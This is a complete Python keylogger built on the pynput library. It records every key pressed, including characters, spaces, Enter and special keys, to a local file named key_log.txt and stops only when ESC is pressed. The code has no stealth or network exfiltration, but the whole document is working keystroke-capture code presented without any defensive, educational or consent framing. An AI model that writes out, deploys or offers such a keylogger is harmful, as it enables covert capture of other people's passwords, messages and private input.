import pynput
from pynput.keyboard import Key, Listener

# Path to store the logged keys
log_file = "key_log.txt"

# Function to log the keys
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")  # Log alphanumeric keys
        except AttributeError:
            if key == Key.space:
                f.write(" ")  # Add a space for spacebar
            elif key == Key.enter:
                f.write("\n")  # Log 'Enter' as a newline
            else:
                f.write(f" [{key}] ")  # Log other special keys

# Function to stop keylogging on 'ESC' press
def on_release(key):
    if key == Key.esc:
        return False  # Stop listener

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
